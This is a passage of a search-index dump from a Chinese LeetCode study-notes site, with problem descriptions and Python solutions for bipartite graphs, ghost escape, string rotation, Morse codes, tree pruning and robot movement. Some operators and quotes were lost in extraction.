range ( 1 , len ( tokens ) - 1 , 2 ): if tokens [ i + 1 ]: d [ tokens [ i ]] = getval ( tokens [ i + 1 ]) return getval ( tokens [ - 1 ]) for c in expression : # \u8fd9\u91cc\u4e0d\u592a\u4e86\u89e3 if c == ( : # \u68c0\u6d4b\u5f53\u524d\u7684\u5b57\u7b26\u662f\u5426\u662f \u5d4c\u5957\u7684\u62ec\u53f7 # \u91cd\u70b9\u662f \u662f\u5426\u4e3a \u8d4b\u503c\u8bed\u53e5 if tokens [ 0 ] == let : evaluate ( tokens ) st . append (( tokens , dict ( d ))) tokens = [ ] elif c == : tokens . append ( ) elif c == ) : val = evaluate ( tokens ) tokens , d = st . pop () tokens [ - 1 ] += val else : tokens [ - 1 ] += c return int ( tokens [ 0 ])","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/781-790/","text":"785 Todo \u5224\u65ad\u4e00\u4e2a\u56fe\u662f\u5426\u7531\u4e24\u4e2a\u56fe\u7ec4\u6210\uff1f \u5b9a\u4e49\u4e00\u4e2a\u56fe\u662f bipartite \uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e2a\u56fe\u7684\u8282\u70b9\u5206\u4e3a\u4e24\u4e2a\u72ec\u7acb\u7684\u81ea\u5df1 A \uff0c B \uff1b\u56fe\u4e2d\u6240\u6709\u7684\u8fb9\u8981\u4e48\u5728A\u4e2d\uff0c\u8981\u4e48\u5728B\u4e2d\uff0c\u90a3\u4e48\u8fd9\u4e2a\u56fe\u662f bipartite \u7684 graph[i]\u662f \u8f93\u5165\u6570\u7ec4\u4e2d\u7684 graph[i] \uff0c\u8868\u793a\u9876\u70b9 i \u6240\u6709\u76f8\u90bb\u7684\u9876\u70b9\uff0c 1 2 3 4 5 6 7 8 9 10 11 12 Example 1: Input: [[1,3], [0,2], [1,3], [0,2]] Output: true Explanation: The graph looks like this: 0----1 | | | | 3----2 We can divide the vertices into two groups: {0, 2} and {1, 3}. \u6bd4\u5982\u5bf9\u4e8e\u4f8b\u5b501\u6765\u8bf4\uff0c\u9876\u70b90\u548c\u9876\u70b91\uff0c3\u76f8\u8fde\uff0c\u9876\u70b91\u548c\u9876\u70b90\uff0c2\u76f8\u8fde\uff0c\u9876\u70b92\u548c\u7ed3\u70b91\uff0c3\u76f8\u8fde\uff0c\u9876\u70b93\u548c\u9876\u70b90\uff0c2\u76f8\u8fde 1 2 3 4 5 6 7 8 9 10 Example 2: Input: [[1,2,3], [0,2], [0,1,3], [0,2]] Output: false Explanation: The graph looks like this: 0----1 | \\ | | \\ | 3----2 We cannot find a way to divide the set of nodes into two independent subsets. \u60f3\u6cd5 \u60f3\u60f3\u8fd9\u8fd8\u662f\u6211\u505a\u7684\u7b2c\u4e00\u4e2a\u56fe\u7684\u9898 \u65e0\u5411\u56fe\u3002\u3002\u3002emmm \u6cd5\u4e00 \u8fd9\u91cc\u9009\u62e9\u67e5\u627e\u8d44\u6599 \u8fd9\u4e2a\u9898\u5f88\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u505a\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u4f7f\u7528\u4f17\u6240\u5468\u77e5\u7684\u67d3\u8272\u6cd5\u3002\u53ef\u4ee5\u901a\u8fc7BFS\u6216\u8005DFS\u6765\u89e3\u51b3\u3002\u6211\u4f7f\u7528\u7684\u662fBFS. \u4f7f\u7528\u4e00\u4e2avisited\u6570\u7ec4\u6765\u4fdd\u5b58\u6bcf\u4e2a\u8282\u70b9\u88ab\u67d3\u7684\u989c\u8272\u30020\u4ee3\u8868\u6ca1\u67d3\u8272\uff0c1\u4ee3\u8868\u67d3\u6210\u84dd\u8272\uff0c2\u4ee3\u8868\u67d3\u6210\u7ea2\u8272\u3002\u5bf9\u56fe\u7684\u6bcf\u4e2a\u9876\u70b9\u8fdb\u884c\u4e00\u4e2a\u904d\u5386\uff0c\u628a\u548c\u8fd9\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u5168\u90e8\u67d3\u6210\u76f8\u53cd\u7684\u989c\u8272\u3002\u5982\u679c\u76f8\u90bb\u9876\u70b9\u5df2\u7ecf\u67d3\u8272\uff0c\u800c\u4e14\u67d3\u8272\u548c\u5f53\u524d\u9876\u70b9\u67d3\u8272\u76f8\u540c\uff0c\u5219\u8fd4\u56deFalse\u3002\u5168\u90e8\u6210\u529f\u67d3\u8272\u540e\u8fd4\u56deTrue\u3002 \u8fd9\u4e2a\u9898\u6ca1\u6709\u8bf4\u660e\u662f\u8fde\u901a\u56fe\uff0c\u8fd9\u4e2a\u5c31\u5f88\u5751\u7239\u4e86\uff0c\u4e0d\u80fd\u901a\u8fc7\u4e00\u6b21\u7684BFS\u5c31\u628a\u6240\u6709\u7684\u9876\u70b9\u67d3\u8272\u6210\u529f\u3002\u6240\u4ee5\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5916\u5c42\u7684\u5bf9\u9876\u70b9\u8fdb\u884c\u904d\u5386\uff0c\u4e00\u4e2a\u5185\u5c42\u7684\u5bf9\u6bcf\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u904d\u5386\uff0c\u8fd9\u6837\u4e24\u91cd\u904d\u5386\u624d\u80fd\u4fdd\u8bc1\u6bcf\u4e2a\u9876\u70b9\u3001\u8fd9\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u90fd\u88ab\u5f3a\u884c\u7684\u67d3\u8272\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution ( object ): def isBipartite ( self , graph ): :type graph: List[List[int]] :rtype: bool # 0-not visited; 1-blue; 2-red; visited = [ 0 ] * len ( graph ) for i in range ( len ( graph )): if graph [ i ] and visited [ i ] == 0 : visited [ i ] = 1 q = [] q . append ( i ) while q : v = q . pop ( 0 ) for node_edge in graph [ v ]: # \u6709\u88ab\u8bbf\u95ee\u5230 if visited [ node_edge ] != 0 : if visited [ node_edge ] == visited [ v ]: return False # \u5982\u679c\u94fe\u63a5\u7684\u8282\u70b9\u6ca1\u6709\u88ab\u8bbf\u95ee\u5230\uff0c\u90a3\u4e48\u53d8\u8272 else : visited [ node_edge ] = 3 - visited [ v ] q . append ( node_edge ) return True 789 \u4e00\u4e2a\u7b80\u5316\u7684Pacman\u6e38\u620f\uff0c\u5f00\u59cb\u4e8e (0.0) \uff0c\u76ee\u6807target\u662f (target[0],target[1]) \uff0c\u73b0\u5728\u4eba\u7269\u9700\u8981\u8fd9\u6837\u79fb\u52a8 \u5730\u56fe\u4e0a\u6709\u51e0\u4e2a\u5e7d\u7075\uff0c\u7b2ci\u4e2a\u5e7d\u7075\u5904\u4e8e (ghost[i][0],ghost[i][1]) \u6bcf\u56de\u5408\uff0c\u4eba\u7269\u548c\u5730\u56fe\u4e0a\u7684\u6240\u6709\u7684\u5e7d\u7075\u90fd \u6709\u53ef\u80fd \u5728\u56db\u4e2a\u57fa\u672c\u65b9\u5411\u4e0a\u79fb\u52a8\uff0c\u6bcf\u6b21\u79fb\u52a8\u4e00\u6b65 \u4eba\u7269\u53ea\u6709\u5728\u5e7d\u7075\u80fd\u6293\u4f4f\u4ed6\u4e4b\u524d\u5230\u8fbe\u76ee\u6807\u5730\u70b9\u624d\u80fd\u7b97\u9003\u8131\uff0c\u800c\u5e7d\u7075\u5728\u4eba\u7269\u5230\u8fbe\u76ee\u6807\u5730\u70b9\u7684\u4e4b\u524d\u4e0e\u4eba\u7269\u5230\u8fbe\u540c\u4e00\u683c\u5b50\uff0c\u5219\u4e0d\u80fd\u9003\u8131\uff08\u5305\u62ec\u540c\u65f6\u5230\u8fbetarget\uff09 \u8fd4\u56de\u662f\u5426\u9003\u8131 1 2 3 4 5 6 7 Example 1: Input: ghosts = [[1, 0], [0, 3]] target = [0, 1] Output: true Explanation: You can directly reach the destination (0, 1) at time 1, while the ghosts located at (1, 0) or (0, 3) have no way to catch up with you. 1 2 3 4 5 6 7 Example 2: Input: ghosts = [[1, 0]] target = [2, 0] Output: false Explanation: You need to reach the destination (2, 0), but the ghost at (1, 0) lies between you and the destination. 1 2 3 4 5 6 7 Example 3: Input: ghosts = [[2, 0]] target = [1, 0] Output: false Explanation: The ghost can reach the target at the same time as you. \u60f3\u6cd5 \u6709\u70b9\u61f5 \u68cb\u76d8\u662f\u65e0\u9650\u5927\u7684\u4e48\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 class Solution : def escapeGhosts ( self , ghosts , target ): target_dist = abs ( target [ 0 ]) + abs ( target [ 1 ]) for r , c in ghosts : ghost_target = abs ( target [ 0 ] - r ) + abs ( target [ 1 ] - c ) if ghost_target = target_dist : return False return True \u9519\u8bef \u8fd9\u91cc\u601d\u8def\u9519\u8bef\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution : def escapeGhosts ( self , ghosts , target ): def isReachable ( target , step ): res = False for ghost in ghosts : if abs ( ghost [ 0 ] - target [ 0 ]) + abs ( ghost [ 1 ] - target [ 1 ]) = step : return True return False # \u53c8\u6b7b\u5faa\u73af\u4e86 def Dfs ( player , step ): if isReachable ( target , step ): return False toNorth = [ player [ 0 ], player [ 1 ] + 1 ] toSouth = [ player [ 0 ], player [ 1 ] - 1 ] toEast = [ player [ 0 ] + 1 , player [ 1 ]] toWest = [ player [ 0 ] - 1 , player [ 1 ]] while player != target : if not isReachable ( toNorth , step + 1 ): if Dfs ( toNorth , step + 1 ): break elif not isReachable ( toSouth , step + 1 ): if Dfs ( toSouth , step + 1 ): break elif not isReachable ( toEast , step + 1 ): if Dfs ( toEast , step + 1 ): break elif not isReachable ( toWest , step + 1 ): if Dfs ( toWest , step + 1 ): break else : return False return True","title":"781 790"},{"location":"LeetCode/vol 7/781-790/#785","text":"Todo \u5224\u65ad\u4e00\u4e2a\u56fe\u662f\u5426\u7531\u4e24\u4e2a\u56fe\u7ec4\u6210\uff1f \u5b9a\u4e49\u4e00\u4e2a\u56fe\u662f bipartite \uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e2a\u56fe\u7684\u8282\u70b9\u5206\u4e3a\u4e24\u4e2a\u72ec\u7acb\u7684\u81ea\u5df1 A \uff0c B \uff1b\u56fe\u4e2d\u6240\u6709\u7684\u8fb9\u8981\u4e48\u5728A\u4e2d\uff0c\u8981\u4e48\u5728B\u4e2d\uff0c\u90a3\u4e48\u8fd9\u4e2a\u56fe\u662f bipartite \u7684 graph[i]\u662f \u8f93\u5165\u6570\u7ec4\u4e2d\u7684 graph[i] \uff0c\u8868\u793a\u9876\u70b9 i \u6240\u6709\u76f8\u90bb\u7684\u9876\u70b9\uff0c 1 2 3 4 5 6 7 8 9 10 11 12 Example 1: Input: [[1,3], [0,2], [1,3], [0,2]] Output: true Explanation: The graph looks like this: 0----1 | | | | 3----2 We can divide the vertices into two groups: {0, 2} and {1, 3}. \u6bd4\u5982\u5bf9\u4e8e\u4f8b\u5b501\u6765\u8bf4\uff0c\u9876\u70b90\u548c\u9876\u70b91\uff0c3\u76f8\u8fde\uff0c\u9876\u70b91\u548c\u9876\u70b90\uff0c2\u76f8\u8fde\uff0c\u9876\u70b92\u548c\u7ed3\u70b91\uff0c3\u76f8\u8fde\uff0c\u9876\u70b93\u548c\u9876\u70b90\uff0c2\u76f8\u8fde 1 2 3 4 5 6 7 8 9 10 Example 2: Input: [[1,2,3], [0,2], [0,1,3], [0,2]] Output: false Explanation: The graph looks like this: 0----1 | \\ | | \\ | 3----2 We cannot find a way to divide the set of nodes into two independent subsets. \u60f3\u6cd5 \u60f3\u60f3\u8fd9\u8fd8\u662f\u6211\u505a\u7684\u7b2c\u4e00\u4e2a\u56fe\u7684\u9898 \u65e0\u5411\u56fe\u3002\u3002\u3002emmm","title":"785"},{"location":"LeetCode/vol 7/781-790/#_1","text":"\u8fd9\u91cc\u9009\u62e9\u67e5\u627e\u8d44\u6599 \u8fd9\u4e2a\u9898\u5f88\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u505a\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u4f7f\u7528\u4f17\u6240\u5468\u77e5\u7684\u67d3\u8272\u6cd5\u3002\u53ef\u4ee5\u901a\u8fc7BFS\u6216\u8005DFS\u6765\u89e3\u51b3\u3002\u6211\u4f7f\u7528\u7684\u662fBFS. \u4f7f\u7528\u4e00\u4e2avisited\u6570\u7ec4\u6765\u4fdd\u5b58\u6bcf\u4e2a\u8282\u70b9\u88ab\u67d3\u7684\u989c\u8272\u30020\u4ee3\u8868\u6ca1\u67d3\u8272\uff0c1\u4ee3\u8868\u67d3\u6210\u84dd\u8272\uff0c2\u4ee3\u8868\u67d3\u6210\u7ea2\u8272\u3002\u5bf9\u56fe\u7684\u6bcf\u4e2a\u9876\u70b9\u8fdb\u884c\u4e00\u4e2a\u904d\u5386\uff0c\u628a\u548c\u8fd9\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u5168\u90e8\u67d3\u6210\u76f8\u53cd\u7684\u989c\u8272\u3002\u5982\u679c\u76f8\u90bb\u9876\u70b9\u5df2\u7ecf\u67d3\u8272\uff0c\u800c\u4e14\u67d3\u8272\u548c\u5f53\u524d\u9876\u70b9\u67d3\u8272\u76f8\u540c\uff0c\u5219\u8fd4\u56deFalse\u3002\u5168\u90e8\u6210\u529f\u67d3\u8272\u540e\u8fd4\u56deTrue\u3002 \u8fd9\u4e2a\u9898\u6ca1\u6709\u8bf4\u660e\u662f\u8fde\u901a\u56fe\uff0c\u8fd9\u4e2a\u5c31\u5f88\u5751\u7239\u4e86\uff0c\u4e0d\u80fd\u901a\u8fc7\u4e00\u6b21\u7684BFS\u5c31\u628a\u6240\u6709\u7684\u9876\u70b9\u67d3\u8272\u6210\u529f\u3002\u6240\u4ee5\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5916\u5c42\u7684\u5bf9\u9876\u70b9\u8fdb\u884c\u904d\u5386\uff0c\u4e00\u4e2a\u5185\u5c42\u7684\u5bf9\u6bcf\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u904d\u5386\uff0c\u8fd9\u6837\u4e24\u91cd\u904d\u5386\u624d\u80fd\u4fdd\u8bc1\u6bcf\u4e2a\u9876\u70b9\u3001\u8fd9\u4e2a\u9876\u70b9\u76f8\u90bb\u7684\u9876\u70b9\u90fd\u88ab\u5f3a\u884c\u7684\u67d3\u8272\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution ( object ): def isBipartite ( self , graph ): :type graph: List[List[int]] :rtype: bool # 0-not visited; 1-blue; 2-red; visited = [ 0 ] * len ( graph ) for i in range ( len ( graph )): if graph [ i ] and visited [ i ] == 0 : visited [ i ] = 1 q = [] q . append ( i ) while q : v = q . pop ( 0 ) for node_edge in graph [ v ]: # \u6709\u88ab\u8bbf\u95ee\u5230 if visited [ node_edge ] != 0 : if visited [ node_edge ] == visited [ v ]: return False # \u5982\u679c\u94fe\u63a5\u7684\u8282\u70b9\u6ca1\u6709\u88ab\u8bbf\u95ee\u5230\uff0c\u90a3\u4e48\u53d8\u8272 else : visited [ node_edge ] = 3 - visited [ v ] q . append ( node_edge ) return True","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/781-790/#789","text":"\u4e00\u4e2a\u7b80\u5316\u7684Pacman\u6e38\u620f\uff0c\u5f00\u59cb\u4e8e (0.0) \uff0c\u76ee\u6807target\u662f (target[0],target[1]) \uff0c\u73b0\u5728\u4eba\u7269\u9700\u8981\u8fd9\u6837\u79fb\u52a8 \u5730\u56fe\u4e0a\u6709\u51e0\u4e2a\u5e7d\u7075\uff0c\u7b2ci\u4e2a\u5e7d\u7075\u5904\u4e8e (ghost[i][0],ghost[i][1]) \u6bcf\u56de\u5408\uff0c\u4eba\u7269\u548c\u5730\u56fe\u4e0a\u7684\u6240\u6709\u7684\u5e7d\u7075\u90fd \u6709\u53ef\u80fd \u5728\u56db\u4e2a\u57fa\u672c\u65b9\u5411\u4e0a\u79fb\u52a8\uff0c\u6bcf\u6b21\u79fb\u52a8\u4e00\u6b65 \u4eba\u7269\u53ea\u6709\u5728\u5e7d\u7075\u80fd\u6293\u4f4f\u4ed6\u4e4b\u524d\u5230\u8fbe\u76ee\u6807\u5730\u70b9\u624d\u80fd\u7b97\u9003\u8131\uff0c\u800c\u5e7d\u7075\u5728\u4eba\u7269\u5230\u8fbe\u76ee\u6807\u5730\u70b9\u7684\u4e4b\u524d\u4e0e\u4eba\u7269\u5230\u8fbe\u540c\u4e00\u683c\u5b50\uff0c\u5219\u4e0d\u80fd\u9003\u8131\uff08\u5305\u62ec\u540c\u65f6\u5230\u8fbetarget\uff09 \u8fd4\u56de\u662f\u5426\u9003\u8131 1 2 3 4 5 6 7 Example 1: Input: ghosts = [[1, 0], [0, 3]] target = [0, 1] Output: true Explanation: You can directly reach the destination (0, 1) at time 1, while the ghosts located at (1, 0) or (0, 3) have no way to catch up with you. 1 2 3 4 5 6 7 Example 2: Input: ghosts = [[1, 0]] target = [2, 0] Output: false Explanation: You need to reach the destination (2, 0), but the ghost at (1, 0) lies between you and the destination. 1 2 3 4 5 6 7 Example 3: Input: ghosts = [[2, 0]] target = [1, 0] Output: false Explanation: The ghost can reach the target at the same time as you. \u60f3\u6cd5 \u6709\u70b9\u61f5 \u68cb\u76d8\u662f\u65e0\u9650\u5927\u7684\u4e48\uff1f","title":"789"},{"location":"LeetCode/vol 7/781-790/#_2","text":"1 2 3 4 5 6 7 8 9 10 class Solution : def escapeGhosts ( self , ghosts , target ): target_dist = abs ( target [ 0 ]) + abs ( target [ 1 ]) for r , c in ghosts : ghost_target = abs ( target [ 0 ] - r ) + abs ( target [ 1 ] - c ) if ghost_target = target_dist : return False return True","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/781-790/#_3","text":"\u8fd9\u91cc\u601d\u8def\u9519\u8bef\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution : def escapeGhosts ( self , ghosts , target ): def isReachable ( target , step ): res = False for ghost in ghosts : if abs ( ghost [ 0 ] - target [ 0 ]) + abs ( ghost [ 1 ] - target [ 1 ]) = step : return True return False # \u53c8\u6b7b\u5faa\u73af\u4e86 def Dfs ( player , step ): if isReachable ( target , step ): return False toNorth = [ player [ 0 ], player [ 1 ] + 1 ] toSouth = [ player [ 0 ], player [ 1 ] - 1 ] toEast = [ player [ 0 ] + 1 , player [ 1 ]] toWest = [ player [ 0 ] - 1 , player [ 1 ]] while player != target : if not isReachable ( toNorth , step + 1 ): if Dfs ( toNorth , step + 1 ): break elif not isReachable ( toSouth , step + 1 ): if Dfs ( toSouth , step + 1 ): break elif not isReachable ( toEast , step + 1 ): if Dfs ( toEast , step + 1 ): break elif not isReachable ( toWest , step + 1 ): if Dfs ( toWest , step + 1 ): break else : return False return True","title":"\u9519\u8bef"},{"location":"LeetCode/vol 7/791-800/","text":"796 \u5982\u679c A = 'abcde' \uff0c\u90a3\u4e48\u5728 A \u4e00\u6b21\u6362\u6863\u540e\u5b83\u5c06\u662f 'bcdea' \u3002\u5f53\u4e14\u4ec5\u5f53 A \u5728 A \u4e0a\u79fb\u4f4d\u4e00\u5b9a\u6570\u91cf\u540e\u53ef\u4ee5\u53d8\u4e3a B \u65f6\u8fd4\u56deTrue 1 2 3 4 5 6 7 Example 1: Input: A = abcde , B = cdeab Output: true Example 2: Input: A = abcde , B = abced Output: false \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\u3002\u3002\u3002 \u6cd5\u4e00 1 2 3 4 5 6 7 8 class Solution : def rotateString ( self , A : str , B : str ) - bool : if not A and not B : return True for i in range ( len ( A )): if A [ i :] + A [: i ] == B : return True return False","title":"791 800"},{"location":"LeetCode/vol 7/791-800/#796","text":"\u5982\u679c A = 'abcde' \uff0c\u90a3\u4e48\u5728 A \u4e00\u6b21\u6362\u6863\u540e\u5b83\u5c06\u662f 'bcdea' \u3002\u5f53\u4e14\u4ec5\u5f53 A \u5728 A \u4e0a\u79fb\u4f4d\u4e00\u5b9a\u6570\u91cf\u540e\u53ef\u4ee5\u53d8\u4e3a B \u65f6\u8fd4\u56deTrue 1 2 3 4 5 6 7 Example 1: Input: A = abcde , B = cdeab Output: true Example 2: Input: A = abcde , B = abced Output: false \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\u3002\u3002\u3002","title":"796"},{"location":"LeetCode/vol 7/791-800/#_1","text":"1 2 3 4 5 6 7 8 class Solution : def rotateString ( self , A : str , B : str ) - bool : if not A and not B : return True for i in range ( len ( A )): if A [ i :] + A [: i ] == B : return True return False","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 8/801-810/","text":"804 \u9996\u5148\u6709\u4e2a\u6469\u5c14\u7f16\u7801\uff0c\u5c06\u4e00\u7ec4\u5b57\u7b26\u4e32\u5c06\u5176\u5bf9\u7167\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684\u6469\u5c14\u7f16\u7801\u5f62\u5f0f\uff0c\u8fd4\u56de\u8fd9\u7ec4\u6469\u5c14\u7f16\u7801\u7684\u4e0d\u540c\u5f62\u5f0f\u4e2a\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ .- , -... , -.-. , -.. , . , ..-. , --. , .... , .. , .--- , -.- , .-.. , -- , -. , --- , .--. , --.- , .-. , ... , - , ..- , ...- , .-- , -..- , -.-- , --.. ] Example: Input: words = [ gin , zen , gig , msg ] Output: 2 Explanation: The transformation of each word is: gin - --...-. zen - --...-. gig - --...--. msg - --...--. There are 2 different transformations, --...-. and --...--. . \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\uff0c\u5148\u66b4\u529b\u8bd5\u8bd5 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def uniqueMorseRepresentations ( self , words ): :type words: List[str] :rtype: int morl_string_set = set () morl = [ .- , -... , -.-. , -.. , . , ..-. , --. , .... , .. , .--- , -.- , .-.. , -- , -. , --- , .--. , --.- , .-. , ... , - , ..- , ...- , .-- , -..- , -.-- , --.. ] for word in words : word = word . lower () s = for char in word : s += morl [ ord ( char ) - ord ( a )] morl_string_set . add ( s ) return len ( morl_string_set )","title":"801 810"},{"location":"LeetCode/vol 8/801-810/#804","text":"\u9996\u5148\u6709\u4e2a\u6469\u5c14\u7f16\u7801\uff0c\u5c06\u4e00\u7ec4\u5b57\u7b26\u4e32\u5c06\u5176\u5bf9\u7167\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684\u6469\u5c14\u7f16\u7801\u5f62\u5f0f\uff0c\u8fd4\u56de\u8fd9\u7ec4\u6469\u5c14\u7f16\u7801\u7684\u4e0d\u540c\u5f62\u5f0f\u4e2a\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ .- , -... , -.-. , -.. , . , ..-. , --. , .... , .. , .--- , -.- , .-.. , -- , -. , --- , .--. , --.- , .-. , ... , - , ..- , ...- , .-- , -..- , -.-- , --.. ] Example: Input: words = [ gin , zen , gig , msg ] Output: 2 Explanation: The transformation of each word is: gin - --...-. zen - --...-. gig - --...--. msg - --...--. There are 2 different transformations, --...-. and --...--. . \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\uff0c\u5148\u66b4\u529b\u8bd5\u8bd5","title":"804"},{"location":"LeetCode/vol 8/801-810/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def uniqueMorseRepresentations ( self , words ): :type words: List[str] :rtype: int morl_string_set = set () morl = [ .- , -... , -.-. , -.. , . , ..-. , --. , .... , .. , .--- , -.- , .-.. , -- , -. , --- , .--. , --.- , .-. , ... , - , ..- , ...- , .-- , -..- , -.-- , --.. ] for word in words : word = word . lower () s = for char in word : s += morl [ ord ( char ) - ord ( a )] morl_string_set . add ( s ) return len ( morl_string_set )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 8/811-820/","text":"814 \u7ed9\u5b9a\u4e00\u4e2a\u6811\uff0c\u6811\u7684\u8282\u70b9\u53ea\u6709\u4e24\u4e2a\u503c\uff0c0\u62161 \u5b9e\u73b0\u4e00\u4e2a\u526a\u679d\u7b97\u6cd5\uff0c\u5c06\u8be5\u6811\u7684\u6240\u6709\u4e0d\u5305\u542b1\u7684\u5b50\u6811\u526a\u679d 1 2 3 4 5 6 7 8 9 10 11 12 Example 1: Input: [1,null,0,0,1] Output: [1,null,0,null,1] 1 0 0 1 | | 1 0 1 \u60f3\u6cd5 \u9012\u5f52\u54af \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 1 0 1 0 0 0 1 \u589e\u52a0\u4e00\u6b21\u6e05\u6d17\uff0c\u628a\u5de6\u5b50\u6811\u76840\u7ed9\u53bb\u6389 1 0 1 1 \u600e\u4e48\u4f18\u5316\u5462 1 2 3 4 5 6 7 8 9 10 11 class Solution : def pruneTree ( self , root : TreeNode ) - TreeNode : if not root : return root if ( not root . left ) and ( not root . right ) and root . val == 0 : return None else : root . left = self . pruneTree ( root . left ) root . left = self . pruneTree ( root . left ) root . right = self . pruneTree ( root . right ) return root \u4f18\u5316 \u8fd8\u662f\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5148\u6e05\u7406\u5b50\u6811\uff0c\u5728\u6e05\u7406\u81ea\u5df1 1 2 3 4 5 6 7 8 9 class Solution : def pruneTree ( self , root : TreeNode ) - TreeNode : if not root : return root root . left = self . pruneTree ( root . left ) root . right = self . pruneTree ( root . right ) if ( not root . left ) and ( not root . right ) and root . val == 0 : return None return root","title":"811 820"},{"location":"LeetCode/vol 8/811-820/#814","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6811\uff0c\u6811\u7684\u8282\u70b9\u53ea\u6709\u4e24\u4e2a\u503c\uff0c0\u62161 \u5b9e\u73b0\u4e00\u4e2a\u526a\u679d\u7b97\u6cd5\uff0c\u5c06\u8be5\u6811\u7684\u6240\u6709\u4e0d\u5305\u542b1\u7684\u5b50\u6811\u526a\u679d 1 2 3 4 5 6 7 8 9 10 11 12 Example 1: Input: [1,null,0,0,1] Output: [1,null,0,null,1] 1 0 0 1 | | 1 0 1 \u60f3\u6cd5 \u9012\u5f52\u54af","title":"814"},{"location":"LeetCode/vol 8/811-820/#_1","text":"1 2 3 4 5 6 7 8 9 1 0 1 0 0 0 1 \u589e\u52a0\u4e00\u6b21\u6e05\u6d17\uff0c\u628a\u5de6\u5b50\u6811\u76840\u7ed9\u53bb\u6389 1 0 1 1 \u600e\u4e48\u4f18\u5316\u5462 1 2 3 4 5 6 7 8 9 10 11 class Solution : def pruneTree ( self , root : TreeNode ) - TreeNode : if not root : return root if ( not root . left ) and ( not root . right ) and root . val == 0 : return None else : root . left = self . pruneTree ( root . left ) root . left = self . pruneTree ( root . left ) root . right = self . pruneTree ( root . right ) return root \u4f18\u5316 \u8fd8\u662f\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5148\u6e05\u7406\u5b50\u6811\uff0c\u5728\u6e05\u7406\u81ea\u5df1 1 2 3 4 5 6 7 8 9 class Solution : def pruneTree ( self , root : TreeNode ) - TreeNode : if not root : return root root . left = self . pruneTree ( root . left ) root . right = self . pruneTree ( root . right ) if ( not root . left ) and ( not root . right ) and root . val == 0 : return None return root","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 8/871-880/","text":"874 \u673a\u5668\u4eba\u5728\u4e00\u4e2a\u65e0\u9650\u5927\u5c0f\u7684\u7f51\u683c\u4e0a\u884c\u8d70\uff0c\u4ece\u70b9(0, 0)\u5904\u5f00\u59cb\u51fa\u53d1\uff0c\u9762\u5411\u5317\u65b9\u3002\u8be5\u673a\u5668\u4eba\u53ef\u4ee5\u63a5\u6536\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b\u7684\u547d\u4ee4\uff1a 1 2 3 4 5 -2\uff1a\u5411\u5de6\u8f6c 90 \u5ea6 -1\uff1a\u5411\u53f3\u8f6c 90 \u5ea6 1 = x = 9\uff1a\u5411\u524d\u79fb\u52a8 x \u4e2a\u5355\u4f4d\u957f\u5ea6 \u5728\u7f51\u683c\u4e0a\u6709\u4e00\u4e9b\u683c\u5b50\u88ab\u89c6\u4e3a\u969c\u788d\u7269\u3002 \u7b2c i \u4e2a\u969c\u788d\u7269\u4f4d\u4e8e\u7f51\u683c\u70b9 (obstacles[i][0], obstacles[i][1]) \u5982\u679c\u673a\u5668\u4eba\u8bd5\u56fe\u8d70\u5230\u969c\u788d\u7269\u4e0a\u65b9\uff0c\u90a3\u4e48\u5b83\u5c06\u505c\u7559\u5728\u969c\u788d\u7269\u7684\u524d\u4e00\u4e2a\u7f51\u683c\u65b9\u5757\u4e0a\uff0c\u4f46\u4ecd\u7136\u53ef\u4ee5\u7ee7\u7eed\u8be5\u8def\u7ebf\u7684\u5176\u4f59\u90e8\u5206\u3002 \u8fd4\u56de\u4ece\u539f\u70b9\u5230\u673a\u5668\u4eba\u7684\u6700\u5927\u6b27\u5f0f\u8ddd\u79bb\u7684\u5e73\u65b9 \u60f3\u6cd5 \u5148\u66b4\u529b\u8bd5\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def robotSim ( self , commands , obstacles ) - int : currentX , currentY = 0 , 0 forward = [[ 0 , 1 ], [ 1 , 0 ], [ 0 , - 1 ], [ - 1 , 0 ]] currentForward = 0 res = 0 for command in commands : if command 0 : for tick in range ( command ): if [ currentX + 